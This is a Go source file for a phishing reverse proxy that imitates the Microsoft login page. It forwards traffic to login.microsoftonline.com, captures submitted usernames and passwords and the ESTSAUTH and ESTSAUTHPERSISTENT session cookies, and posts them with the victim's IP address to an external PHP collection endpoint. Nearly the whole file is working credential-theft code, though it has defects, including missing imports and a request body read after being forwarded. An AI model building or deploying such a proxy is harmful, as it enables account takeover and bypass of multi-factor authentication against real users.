package main

import (
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "net/http"
    "os"
    "strings"
)

// Constants for upstream and server configurations
const (
    upstream        = "https://login.microsoftonline.com"
    upstreamPath    = "/"
    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
)

// Variables for blocking regions and IP addresses
var (
    blockedRegions = []string{}
    blockedIPs     = []string{"0.0.0.0", "127.0.0.1"}
)

// generateNonce generates a random nonce for use in CSP
func generateNonce() (string, error) {
    nonce := make([]byte, 16)
    if _, err := rand.Read(nonce); err != nil {
        return "", err
    }
    return base64.StdEncoding.EncodeToString(nonce), nil
}

func main() {
    // Retrieve the PORT from environment variables
    port := os.Getenv("PORT")
    if port == "" {
        port = "8080" // Default to port 8080 if not set
        fmt.Println("PORT environment variable not set, defaulting to 8080")
    }

    http.HandleFunc("/", handleRequest)
    fmt.Printf("Starting proxy server on port %s...\n", port)
    if err := http.ListenAndServe("0.0.0.0:"+port, nil); err != nil {
        fmt.Printf("Error starting server: %v\n", err)
        os.Exit(1)
    }
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
    // Generate a nonce for this request
    nonce, err := generateNonce()
    if err != nil {
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    // Set the CSP header with the generated nonce to allow inline scripts
    w.Header().Set("Content-Security-Policy", fmt.Sprintf(
        "default-src 'self'; "+
        "script-src 'self' 'nonce-%s' https://aadcdn.msftauth.net https://login.live.com; "+
        "style-src 'self' 'nonce-%s' https://aadcdn.msftauth.net; "+
        "img-src 'self' https://aadcdn.msftauth.net; "+
        "connect-src 'self' https://login.microsoftonline.com; "+
        "font-src 'self' https://aadcdn.msftauth.net; "+
        "frame-src 'self' https://login.microsoftonline.com; "+
        "object-src 'none'; "+
        "base-uri 'self';", nonce, nonce))

    region := r.Header.Get("cf-ipcountry")
    ipAddress := r.Header.Get("cf-connecting-ip")

    if isBlocked(region, ipAddress) {
        http.Error(w, "Access denied.", http.StatusForbidden)
        return
    }

    upstreamURL := upstream + upstreamPath + r.URL.Path
    req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
    if err != nil {
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    copyHeaders(r.Header, &req.Header)
    req.Header.Set("Host", "login.microsoftonline.com")
    req.Header.Set("Referer", r.Referer())

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        http.Error(w, "Error contacting upstream server", http.StatusInternalServerError)
        return
    }
    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    bodyString := string(body)

    // Extract specific cookies and send them to the PHP backend
    estsAuthCookie := extractSpecificCookie(resp, "ESTSAUTH")
    estsAuthPersistentCookie := extractSpecificCookie(resp, "ESTSAUTHPERSISTENT")

    if estsAuthCookie != "" || estsAuthPersistentCookie != "" {
        cookies := fmt.Sprintf("ESTSAUTH: %s\nESTSAUTHPERSISTENT: %s", estsAuthCookie, estsAuthPersistentCookie)
        sendToServer(cookies, ipAddress)
    }

    if r.Method == "POST" {
        username, password := extractCredentials(r)
        if username != "" && password != "" {
            message := fmt.Sprintf("User: %s\nPassword: %s\n", username, password)
            sendToServer(message, ipAddress)
        }
    }

    bodyString = strings.ReplaceAll(bodyString, "login.microsoftonline.com", r.Host)

    for name, values := range resp.Header {
        for _, value := range values {
            w.Header().Add(name, value)
        }
    }

    w.WriteHeader(resp.StatusCode)
    w.Write([]byte(bodyString))
}

func copyHeaders(src http.Header, dst *http.Header) {
    for k, v := range src {
        for _, vv := range v {
            dst.Add(k, vv)
        }
    }
}

func isBlocked(region, ipAddress string) bool {
    for _, blockedRegion := range blockedRegions {
        if strings.EqualFold(blockedRegion, region) {
            return true
        }
    }
    for _, blockedIP := range blockedIPs {
        if blockedIP == ipAddress {
            return true
        }
    }
    return false
}

func extractCredentials(r *http.Request) (string, string) {
    bodyBytes, err := ioutil.ReadAll(r.Body)
    if err != nil {
        return "", ""
    }

    bodyString := string(bodyBytes)
    r.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))

    username := extractValueFromBody(bodyString, "login")
    password := extractValueFromBody(bodyString, "passwd")

    return username, password
}

func extractValueFromBody(body, key string) string {
    params := strings.Split(body, "&")
    for _, param := range params {
        pair := strings.SplitN(param, "=", 2)
        if len(pair) == 2 && pair[0] == key {
            return pair[1]
        }
    }
    return ""
}

func extractSpecificCookie(resp *http.Response, cookieName string) string {
    cookies := resp.Cookies()
    for _, cookie := range cookies {
        if cookie.Name == cookieName {
            return cookie.Value
        }
    }
    return ""
}

func sendToServer(data, ipAddress string) {
    payload := fmt.Sprintf(`{"data": "%s", "ip": "%s"}`, data, ipAddress)
    _, err := http.Post(serverURL, "application/json", strings.NewReader(payload))
    if err != nil {
        fmt.Println("Failed to send data to server:", err)
    }
}
